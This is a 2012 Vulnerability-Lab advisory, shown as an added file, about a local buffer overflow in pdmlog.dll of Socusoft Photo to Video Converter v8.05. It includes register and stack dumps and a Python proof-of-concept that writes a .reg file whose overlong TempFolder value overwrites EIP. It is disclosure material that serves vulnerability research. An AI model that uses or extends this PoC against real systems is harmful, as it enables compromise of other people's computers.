@@ -1,0 +1,198 @@
+Title:
+======
+Socusoft Photo 2 Video v8.05 - Buffer Overflow Vulnerability
+
+
+Date:
+=====
+2012-02-27
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=460
+
+
+VL-ID:
+=====
+460
+
+
+Introduction:
+=============
+Socusoft photo to video converter Professional allows you to create all kinds of eye-catching 
+slideshow videos (mp4, flv, mov, avi, mkv, mpeg, h.264, h.264 HD, 3gp, 3gpp2, swf ) playable on 
+YouTube, Facebook, MySpace, iPod, iPad, iphone, Archos, PSP, Zune. With the powerful Photo to Video 
+Converter Professional,you could convert photo to the animating and dynamic video and share the 
+video on YouTube, Facebook, MySpace, iPod, iPad, iPhone. With just a few minutes of work, you\\\'ll 
+have an eye-catching slideshow video with background music and dynamic pan&zoom and attractive 
+transition effects. This powerful Photo to Video Converter Professional supports Over 260 animating 
+transition effects with Pan & Zoom effect.
+
+(Copy of the Vendor Homepage:  )
+
+
+Abstract:
+=========
+A Vulnerability Laboratory Researcher discovered a Local Buffer Overflow vulnerability on Socusofts Photo to Video 
+Converter Free and Professional v8.05
+
+
+Report-Timeline:
+================
+2012-02-27:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Affected Products:
+==================
+Socusoft Photo 2 Video v8.05
+
+
+Exploitation-Technique:
+=======================
+Local
+
+
+Severity:
+=========
+High
+
+
+Details:
+========
+A Buffer Overflow vulnerability is detected on Socusoft Photo to Video Converter Free and Professional v8.05 (current version). 
+The vulnerability is located in the pdmlog.dll. Successful exploitation can result in execution of code, overwrite of registers & system compromise.
+
+Vulnerable DLL(s):
+                                                [+] pdmlog.dll
+
+
+--- Registers ---
+# EAX 42424242
+# EBX 00360000 pdmlog.dll:00360000
+# ECX 0036BF3B pdmlog.dll:pdmlog_5+A66B
+# EDX 80284006 
+# ESI 00000002
+# EDI 00000000
+# EBP 01C5FC0C Stack[000001AC]:01C5FC0C
+# ESP 01C5FBF0 Stack[000001AC]:01C5FBF0
+# EIP 42424242
+# EFL 00010206
+
+--- Stack ---
+# 01C5FBE0  00000000
+# 01C5FBE4  00000002
+# 01C5FBE8  000094B7
+# 01C5FBEC  00000001
+# 01C5FBF0  0036BF6F  pdmlog.dll:pdmlog_5+A69F  <- Crash
+# 01C5FBF4  00360000  pdmlog.dll:00360000
+# 01C5FBF8  00000002
+# 01C5FBFC  00000000
+# 01C5FC00  00000000
+# 01C5FC04  01C5FC20  Stack[000001AC]:01C5FC20
+# 01C5FC08  7FFDE000  debug066:7FFDE000
+
+--- Dump ---
+# 00370584  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+# 00370594  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+# 003705A4  42 42 42 42 43 43 43 43  43 43 43 43 43 43 43 43  BBBBCCCCCCCCCCCC
+# 003705B4  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+# 003705C4  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+
+
+Picture(s):
+                                                ../1.png
+
+
+Proof of Concept:
+=================
+The Vulnerability can be exploited by local attackers. For demonstration or reproduce ...
+
+#!/usr/bin/python
+ 
+# Exploit Title: Socusoft Photo to Video Converter Free/Pro v8.05 (pdmlog.dll) Local Buffer Overflow PoC
+# Version:       8.05
+# Date:          2012-02-26
+# Author:        Julien Ahrens
+# Homepage:      http://www.inshell.net
+# Software Link: http://www.socusoft.com
+# Tested on:     Windows XP SP3 Professional German
+# Notes:         Overflow occurs in pdmlog.dll
+# Howto:         Import Reg -> Start App
+
+# EAX 42424242
+# EBX 00360000 pdmlog.dll:00360000
+# ECX 0036BF3B pdmlog.dll:pdmlog_5+A66B
+# EDX 80284006 
+# ESI 00000002
+# EDI 00000000
+# EBP 01C5FC0C Stack[000001AC]:01C5FC0C
+# ESP 01C5FBF0 Stack[000001AC]:01C5FBF0
+# EIP 42424242
+# EFL 00010206
+
+# 01C5FBE0  00000000
+# 01C5FBE4  00000002
+# 01C5FBE8  000094B7
+# 01C5FBEC  00000001
+# 01C5FBF0  0036BF6F  pdmlog.dll:pdmlog_5+A69F  <- Crash
+# 01C5FBF4  00360000  pdmlog.dll:00360000
+# 01C5FBF8  00000002
+# 01C5FBFC  00000000
+# 01C5FC00  00000000
+# 01C5FC04  01C5FC20  Stack[000001AC]:01C5FC20
+# 01C5FC08  7FFDE000  debug066:7FFDE000
+
+file="poc.reg"
+
+junk1="\x41" * 548
+boom="\x42\x42\x42\x42"
+junk2="\x43" * 100
+
+poc="Windows Registry Editor Version 5.00\n\n"
+poc=poc + "[HKEY_CURRENT_USER\Software\Socusoft Photo to Video Converter Free Version\General]\n"
+poc=poc + "\"TempFolder\"=\"" + junk1 + boom + junk2 + "\""
+
+try:
+    print "[*] Creating exploit file...\n";
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!";
+except:
+    print "[!] Error while creating file!";
+
+
+Risk:
+=====
+The security risk of the local buffer overflow vulnerability is estimated as high(-). 
+
+
+Credits:
+========
+Vulnerability Research Laboratory   -   Julien Ahrens  (MrTuxracer)  [www.inshell.net]
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+    						Copyright ? 2012|Vulnerability-Lab
+
+-- 
+Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
+Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com
+
+
